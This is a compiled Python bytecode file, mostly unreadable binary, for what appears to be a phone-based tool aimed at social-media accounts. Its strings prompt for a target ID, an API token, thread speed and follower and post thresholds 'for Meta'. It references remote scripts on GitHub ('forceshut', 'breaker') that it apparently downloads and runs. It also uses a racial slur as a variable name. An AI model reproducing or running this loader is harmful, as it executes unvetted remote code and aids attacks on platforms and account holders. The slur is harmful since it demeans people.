\001\000\002\000e\"d e(\233\000d!\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d\"\235\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d!\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d#\235\005\246\001\000\000\253\001\000\000\000""\000\000\000\000\000\001\000\002\000e\"d e(\233\000d!\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d$\235\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/e'\233\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d%\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\nj+\000\000\000\000\000\000\000\000d&\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z,\002\000e-e,j.\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d'e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e1d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z2\002\000e\"d e(\233\000d)e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e1d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z3\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d*e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e4e2e3\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000\002\000e/e'\233\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\001j*\000\000\000\000\000\000\000\000d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\nj+\000\000\000\000\000\000\000\000d+\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z,\002\000e-e,j.\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"e0\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000""\002\000e\"d e(\233\000d,e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d-e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d.e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d/e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e1d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z5\002\000e/e'\233\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000e5d0k\002\000\000\000\000r\003d1Z6n-e5d2k\002\000\000\000\000r\003d3Z6n$e5d4k\002\000\000\000\000r\003d5Z6n\033\002\000e\"d e(\233\000d6e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e7\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d7e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d8e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d9e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e8d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z9\002\000e\"d e(\233\000d:e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d8e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000d;e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e8d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003""\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z:\002\000e\001j*\000\000\000\000\000\000\000\000d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/d<\240;\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d=\221\001e'\233\000\221\001d>\221\001e(\233\000\221\001d?\221\001e'\233\000\221\001d@\221\001e'\233\000\221\001dA\221\001e(\233\000\221\001dB\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dC\221\001e(\233\000\221\001dD\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dE\221\001e(\233\000\221\001dF\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dG\221\001e(\233\000\221\001dH\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dI\221\001e(\233\000\221\001dJ\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dK\221\001e(\233\000\221\001dL\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dM\221\001e(\233\000\221\001dN\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dO\221\001e(\233\000\221\001dP\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dQ\221\001e(\233\000\221\001dR\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dS\221\001e(\233\000\221\001dT\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dU\221\001e(\233\000\221\001dV\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dW\221\001e(\233\000\221\001dX\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001dY\221\001e(\233\000\221\001dZ\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001d[\221\001e(\233\000\221\001d\\\221\001\002\000e)""\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001d]\221\001e(\233\000\221\001d^\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001d_\221\001e(\233\000\221\001d`\221\001\002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000\221\001da\221\001e'\233\000\221\001db\221\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"d e(\233\000dce'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e1d \002\000e)\246\000\000\000\253\000\000\000\000\000\000\000\000\000\233\000d(\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z<\002\000e/e'\233\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\001j*\000\000\000\000\000\000\000\000d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000e<d0k\002\000\000\000\000s\006e<ddk\002\000\000\000\000r\006deZ=dfZ>\220\001n/e<d2k\002\000\000\000\000s\006e<dgk\002\000\000\000\000r\006dfZ=dhZ>\220\001n\035e<d4k\002\000\000\000\000s\006e<dik\002\000\000\000\000r\006dhZ=djZ>\220\001n\013e<dkk\002\000\000\000\000s\006e<dlk\002\000\000\000\000r\005djZ=dmZ>n\372e<dnk\002\000\000\000\000s\006e<dok\002\000\000\000\000r\005dmZ=dpZ>n\351e<dqk\002\000\000\000\000s\006e<drk\002\000\000\000\000r\005dpZ=dsZ>n\330e<dtk\002\000\000\000\000s\006e<duk\002\000\000\000\000r\005dsZ=dvZ>n\307e<dwk\002\000\000\000\000s\006e<dxk\002\000\000\000\000r\005dvZ=dyZ>n\266e<dzk\002\000\000\000\000s\006e<d{k\002\000\000\000\000r\005dyZ=d|Z>n\245e<d}k\002\000\000\000\000s\006e<d~k\002\000\000\000\000r\005d|Z=dZ>n\224e<d\200k\002\000\000\000\000s\006e<d\201k\002\000\000\000\000r\005dZ=d\202Z>n\203e<d\203k\002\000\000\000\000s\006e<d\204k\002\000\000\000\000r\005d\202Z=d\205Z>nre<d\206k\002\000\000\000\000s\006e<d\207k\002\000\000\000\000r\005dhZ=dvZ>nae<d\210k\002\000\000\000\000s\006e<d\211k\002\000\000\000\000r\005dyZ=d\202Z>n""Pe<d\212k\002\000\000\000\000s\006e<d\213k\002\000\000\000\000r\tdjZ=dvZ>d\214Z:d\215Z9n;e<d\216k\002\000\000\000\000r\tdhZ=djZ>d\217Z:d\215Z9n,e<d\220k\002\000\000\000\000s\006e<d\031k\002\000\000\000\000r\005d\221Z=d\202Z>n\033\002\000e\"d e(\233\000d6e'\233\000\235\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e7\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\001x\001a?x\001a@x\001aAaBi\000ZCd\222\204\000ZDd\223\204\000ZEd\224\204\000ZF\002\000eF\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\225\204\000ZG\002\000e\001j*\000\000\000\000\000\000\000\000d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\"e0\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/d=\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\027\246\000\000\000\253\000\000\000\000\000\000\000\000\000ZH\002\000e\021\246\000\000\000\253\000\000\000\000\000\000\000\000\000ZId\226\204\000ZJd\227\204\000ZKd\230\204\000ZL\002\000eL\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\231\204\000ZMd\232\204\000ZNd\233\204\000ZOd\234\204\000ZP\002\000eQe6\246\001\000\000\253\001\000\000\000\000\000\000\000\000D\000]$ZR\002\000e\tePe:e9eMf\003\254\235\246\002\000\000\253\002\000\000\000\000\000\000\000\000\240S\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\214%d\002S\000)\240u>\000\000\000\360\235\220\205\360\235\232\212\360\235\232\235\360\235\232\216\360\235\232\234 \360\235\220\200\360\235\232\233\360\235\232\216 \360\235\220\226\360\235\232\233\360\235\232\222\360\235\232\235\360\235\232\235\360\235\232\216\360\235\232\227\351\000\000\000\000N)\001\332\006Thread)\001\332\004post)\001\332\006render)\002\332\007Console\332\005Group)\001\332\004Live)\001\332\004Text)\001\332\004Lock)\001\332\010datetime)\002\332\006choice\332\trandrange)\001\332\023generate_user""_agent\347T\344\020qs*\311>c\002\000\000\000\000\000\000\000\000\000\000\000\004\000\000\000\003\000\000\000\363\316\000\000\000\227\000|\000D\000]S}\002t\000\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000\240\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000t\000\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000t\t\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000|\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\214Tt\r\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\000S\000\251\001N)\007\332\003sys\332\006stdout\332\005write\332\005flush\332\004time\332\005sleep\332\005print)\003\332\004text\332\005delay\332\004chars\003\000\000\000   \372'/storage/emulated/0/.oblivion/dakhla.py\332\004animr\035\000\000\000\022\000\000\000s[\000\000\000\200\000\330\020\024\360\000\003\005\032\360\000\003\005\032\210\004\335\010\013\214\n\327\010\030\322\010\030\230\024\321\010\036\324\010\036\320\010\036\335\010\013\214\n\327\010\030\322\010\030\321\010\032\324\010\032\320\010\032\335\010\014\214\n\2205\321\010\031\324\010\031\320\010\031\320\010\031\335\004\t\201G\204G\200G\200G\200G\363\000\000\000\000)\013\351\365\000\000\000\351\366\000\000\000\351\367\000\000\000\351\370\000\000\000\351\371\000\000\000\351\372\000\000\000\351\373\000\000\000\351\374\000\000\000\351\375\000\000\000\351\376\000\000\000\351\377\000\000\000\351d\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\006\000\000\000\003\000\000\000\363\244\000\000\000\227\000g\000}\001t\001\000\000\000\000\000\000\000\000\000\000|\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000D\000]=}""\002t\002\000\000\000\000\000\000\000\000\000\000|\002t\005\000\000\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000z\006\000\000\031\000\000\000\000\000\000\000\000\000}\003|\001\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001|\003\233\000d\002\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\214>|\001S\000)\003Nz\t\033[1;38;5;\332\001m)\004\332\005range\332\004gray\332\003len\332\006append)\004\332\001n\332\006colors\332\001i\332\004codes\004\000\000\000    r\034\000\000\000\332\004rgenr5\000\000\000\036\000\000\000sV\000\000\000\200\000\330\r\017\200F\335\r\022\2201\211X\214X\360\000\002\005.\360\000\002\005.\210\001\335\017\023\220A\235\003\235D\231\t\234\t\221M\324\017\"\210\004\330\010\016\217\r\212\r\320\026,\240T\320\026,\320\026,\320\026,\321\010-\324\010-\320\010-\320\010-\330\013\021\200Mr\036\000\000\000z\007\033[0;30mz\004\033[0mz\007\033[1;37mc\000\000\000\000\000\000\000\000\000\000\000\000\004\000\000\000\003\000\000\000\363:\001\000\000\227\000t\001\000\000\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000d\001\246\002\000\000\253\002\000\000\000\000\000\000\000\000s#t\004\000\000\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000_\004\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000s\031t\013\000\000\000\000\000\000\000\000\000\000d\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000_\004\000\000\000\000\000\000\000\000t\r\000\000\000\000\000\000\000\000\000\000j\007\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000\246\001""\000\000\253\001\000\000\000\000\000\000\000\000}\000t\002\000\000\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000\240\010\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000|\000S\000)\003N\332\tremainingr*\000\000\000)\t\332\007hasattr\332\007niggerz\332\nall_colors\332\004copyr7\000\000\000r5\000\000\000\332\006randomr\014\000\000\000\332\006remove)\001\332\005colors\001\000\000\000 r\034\000\000\000r9\000\000\000r9\000\000\000*\000\000\000sm\000\000\000\200\000\335\013\022\2257\230K\321\013(\324\013(\360\000\001\005.\335\034&\237O\232O\321\034-\324\034-\215\007\324\010\031\335\013\022\324\013\034\360\000\001\005&\335\034 \240\023\231I\234I\215\007\324\010\031\335\014\022\214M\235'\324\032+\321\014,\324\014,\200E\335\004\013\324\004\025\327\004\034\322\004\034\230U\321\004#\324\004#\320\004#\330\013\020\200Lr\036\000\000\000\332\005clearzFhttps://raw.githubusercontent.com/dvm-b/forceshut/refs/heads/main/s.pyuV\000\000\000 this is beta testing, please report any issues to developer @uouch \342\232\240\357\270\217\342\232\240\357\270\217\342\232\240\357\270\217\332\004dvmb\332\005white\332\005black\332\006centerr.\000\000\000)\003r2\000\000\000\332\005align\332\nbackgroundu\206\000\000\000     \342\224\214\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\220u\004\000\000\000 \343\205\244u\007\000\000\000\343\205\244\342\236\241 u\202\000\000\000\360\235\220\223\360\235\232\221\360\235\232\222\360\235\232""\234 \360\235\220\210\360\235\232\234 \360\235\220\217\360\235\232\212\360\235\232\222\360\235\232\215 \360\235\220\200\360\235\232\225\360\235\232\225\360\235\232\233\360\235\232\230\360\235\232\236\360\235\232\227\360\235\232\215\360\235\232\216\360\235\232\233 \360\235\220\211\360\235\232\212\360\235\232\214\360\235\232\224\360\235\232\222\360\235\232\227\360\235\232\220 \360\235\220\223\360\235\232\230\360\235\232\230\360\235\232\225 u7\000\000\000\360\235\220\203\360\235\232\216\360\235\232\237\360\235\232\216\360\235\232\225\360\235\232\230\360\235\232\231\360\235\232\216\360\235\232\233 - \360\235\220\203\360\235\225\247\341\264\215\360\235\231\261 u\205\000\000\000\360\235\220\202\360\235\232\221\360\235\232\212\360\235\232\227\360\235\232\227\360\235\232\216\360\235\232\225 - @\360\235\232\215\360\235\232\237\360\235\232\226\360\235\232\213\360\235\232\231\360\235\232\242, \360\235\220\200\360\235\227\205\360\235\227\205 \360\235\220\221\360\235\227\202\360\235\227\200\360\235\227\201\360\235\227\215\360\235\227\214 \360\235\220\221\360\235\226\276\360\235\227\214\360\235\226\276\360\235\227\213\360\235\227\217\360\235\226\276\360\235\226\275 \302\251. u\206\000\000\000     \342\224\224\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\230zJhttps://raw.githubusercontent.com/dvm-b/forceshut/refs/heads/main/cotya.pyul\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 \360\235\220\210\360\235\231\263 \360\235\220\201\360\235\232\216\360""\235\232\225\360\235\232\230\360\235\232\240  [ 10 \360\235\220\203\360\235\232\222\360\235\232\220\360\235\232\222\360\235\232\235\360\235\232\234 ]  \342\217\216u\013\000\000\000\343\205\244\342\236\241  \343\205\244uc\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 \360\235\220\200\360\235\232\231\360\235\232\222 \360\235\220\223\360\235\232\230\360\235\232\224\360\235\232\216\360\235\232\227 \360\235\220\201\360\235\232\216\360\235\232\225\360\235\232\230\360\235\232\240 \342\217\216ug\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\217\360\235\232\233\360\235\232\230\360\235\232\214\360\235\232\216\360\235\232\234\360\235\232\234\360\235\232\222\360\235\232\227\360\235\232\220, \360\235\220\217\360\235\232\225\360\235\232\216\360\235\232\212\360\235\232\234\360\235\232\216 \360\235\220\226\360\235\232\212\360\235\232\222\360\235\232\235zGhttps://raw.githubusercontent.com/dvm-b/breaker/refs/heads/main/damn.pyuN\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\222\360\235\232\216\360\235\232\225\360\235\232\216\360\235\232\214\360\235\232\235 \360\235\220\223\360\235\232\221\360\235\232\216 \360\235\220\222\360\235\232\231\360\235\232\216\360\235\232\216\360\235\232\215u\224\000\000\000\343\205\244\033[100m[ \342\232\240\357\270\217 ]   \360\235\220\207\360\235\232\222\360\235\232\220\360\235\232\221 \360\235\220\222\360\235\232\231\360\235\232\216\360\235\232\216\360\235\232\215 \360\235\220\206\360\235\232\222\360\235\232\237\360\235\232\216\360\235\232\234 \360\235\220\207\360\235\232\222\360\235\232\220\360\235\232\221 \360\235\220\222\360\235\232\235\360\235\232\236\360\235\232\214\360\235\232\224 \360\235\220\202\360\235\232\221\360\235\232\212\360\235\232\227\360\235\232\214\360\235\232\216\360\235\232\234.uU\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\237\217. \360\235\220\213\360\235\232\230\360\235\232\240 / \360\235""\237\220. \360\235\220\214\360\235\232\222\360\235\232\215 / \360\235\237\221. \360\235\220\205\360\235\232\212\360\235\232\234\360\235\232\235 uv\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\202\360\235\232\221\360\235\232\230\360\235\232\230\360\235\232\234\360\235\232\216 \360\235\220\200\360\235\232\227\360\235\232\215 \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 \360\235\220\201\360\235\232\216\360\235\232\225\360\235\232\230\360\235\232\240  [1 , 2 , 3 ]  \342\217\216\332\0011\351\226\000\000\000\332\0012\351\310\000\000\000\332\0013r$\000\000\000u\211\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\210\360\235\232\234 \360\235\220\230\360\235\232\230\360\235\232\236\360\235\232\233 \360\235\220\201\360\235\232\233\360\235\232\212\360\235\232\222\360\235\232\227 \360\235\220\213\360\235\232\230\360\235\232\214\360\235\232\212\360\235\232\235\360\235\232\216\360\235\232\215 \360\235\220\210\360\235\232\227 \360\235\220\230\360\235\232\230\360\235\232\236\360\235\232\233 \360\235\220\200\360\235\232\234\360\235\232\234?  u\236\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 \360\235\220\223\360\235\232\221\360\235\232\216 \360\235\220\214\360\235\232\222\360\235\232\227\360\235\232\222\360\235\232\226\360\235\232\236\360\235\232\226 \360\235\220\200\360\235\232\226\360\235\232\230\360\235\232\236\360\235\232\227\360\235\232\235 \360\235\220\216\360\235\232\217 \360\235\220\217\360\235\232\230\360\235\232\234\360\235\232\235\360\235\232\234 \360\235\220\201\360\235\232\216\360\235\232\225\360\235\232\230\360\235\232\240ur\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\216\360\235\232\227\360\235\232\225\360\235\232\242 \360\235\220\200 \360\235\220\215\360\235\232\236\360\235\232\226\360\235\232\213\360\235\232\216\360\235\232\233 \360\235\220\201\360\235\232\216\360\235\232\235\360\235""\232\240\360\235\232\216\360\235\232\216\360\235\232\227 0 \360\235\220\223\360\235\232\230 100 \342\217\216u\260\000\000\000\343\205\244\033[100m[ \342\232\240\357\270\217 ]  \360\235\220\217\360\235\232\230\360\235\232\234\360\235\232\235\360\235\232\234 \342\206\221 \360\235\220\222\360\235\232\231\360\235\232\216\360\235\232\216\360\235\232\215 \342\206\223, \360\235\220\221\360\235\232\216\360\235\232\214\360\235\232\230\360\235\232\226\360\235\232\226\360\235\232\216\360\235\232\227\360\235\232\215\360\235\232\216\360\235\232\215 5 / 10 \360\235\220\205\360\235\232\230\360\235\232\233 \360\235\220\214\360\235\232\216\360\235\232\235\360\235\232\212 / \360\235\220\201\360\235\232\222\360\235\232\243\360\235\232\243 \342\217\216u\256\000\000\000\343\205\244\033[100m[ \342\232\232 ]    \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 \360\235\220\223\360\235\232\221\360\235\232\216 \360\235\220\214\360\235\232\222\360\235\232\227\360\235\232\222\360\235\232\226\360\235\232\236\360\235\232\226 \360\235\220\200\360\235\232\226\360\235\232\230\360\235\232\236\360\235\232\227\360\235\232\235 \360\235\220\216\360\235\232\217 \360\235\220\205\360\235\232\230\360\235\232\225\360\235\232\225\360\235\232\230\360\235\232\240\360\235\232\216\360\235\232\233\360\235\232\234 \360\235\220\201\360\235\232\216\360\235\232\225\360\235\232\230\360\235\232\240u\251\000\000\000\343\205\244\033[100m[ \342\232\240\357\270\217 ]  \360\235\220\205\360\235\232\230\360\235\232\225\360\235\232\225\360\235\232\230\360\235\232\240\360\235\232\216\360\235\232\233\360\235\232\234 \342\206\221 \360\235\220\222\360\235\232\231\360\235\232\216\360\235\232\216\360\235\232\215 \342\206\223, \360\235\220\204\360\235\232\227\360\235\232\235\360\235\232\216\360\235\232\233 30 / 50 \360\235\220\205\360\235\232\230\360\235\232\233 \360\235\220\214\360\235\232\216\360\235\232\235\360\235\232\212 / \360\235\220\201\360\235\232\222\360\235\232\243\360\235\232\243 \342\217""\216\332\000\372\001\tuo\000\000\000\t\342\225\255\342\213\237\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\225\256\n\t\343\205\244u^\000\000\000\360\235\220\222\360\235\232\216\360\235\232\225\360\235\232\216\360\235\232\214\360\235\232\235 \360\235\220\205\360\235\232\233\360\235\232\230\360\235\232\226 \360\235\220\223\360\235\232\221\360\235\232\216 \360\235\220\205\360\235\232\230\360\235\232\225\360\235\232\225\360\235\232\230\360\235\232\240\360\235\232\222\360\235\232\227\360\235\232\220\n\t\tul\000\000\000\342\225\260\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\213\236\342\225\257\n\t\tuo\000\000\000\342\225\255\342\213\237\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\225\256\n\t \343\205\244u\t\000\000\000[ \360\235\237\217 ] u,\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\257  [ \360\235\220\213\360\235\232\236\360\235\232\214\360\235\232\224 ]\n\t \343\205\244u\t\000\000\000[ \360\235\237\220 ] u\026\000\000\000\360""\235\237\256\360\235\237\254\360\235\237\255\360\235\237\260\n\t \343\205\244u\t\000\000\000[ \360\235\237\221 ] u\027\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\261 \n\t \343\205\244u\t\000\000\000[ \360\235\237\222 ] u\026\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\262\n\t \343\205\244u\t\000\000\000[ \360\235\237\223 ] u\026\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\263\n\t \343\205\244u\t\000\000\000[ \360\235\237\224 ] u\026\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\264\n\t \343\205\244u\t\000\000\000[ \360\235\237\225 ] u\026\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\265\n\t \343\205\244u\t\000\000\000[ \360\235\237\226 ] u\026\000\000\000\360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\254\n\t \343\205\244u\t\000\000\000[ \360\235\237\227 ] u\025\000\000\000\360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\255\n\t\343\205\244u\r\000\000\000[ \360\235\237\217\360\235\237\216 ] u\025\000\000\000\360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\256\n\t\343\205\244u\r\000\000\000[ \360\235\237\217\360\235\237\217 ] u\025\000\000\000\360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\257\n\t\343\205\244u\r\000\000\000[ \360\235\237\217\360\235\237\220 ] uA\000\000\000\360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\260 / \360\235\237\256\360\235\237\254\360\235\237\256\360\235\237\261 [ \360\235\220\221\360\235\232\212\360\235\232\233\360\235\232\216 ]\n\t \n\t \343\205\244u\t\000\000\000[ \360\235\220\200 ] uF\000\000\000\360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\260 - \360\235\237\256\360\235\237\254\360\235\237\255\360\235\237\265 [ \360\235\220\221\360\235\232\212\360\235\232\227\360\235\232\215\360\235\232\230\360\235\232\226 ]\n\t \343\205\244u\t\000\000\000[ \360\235\220\201 ] 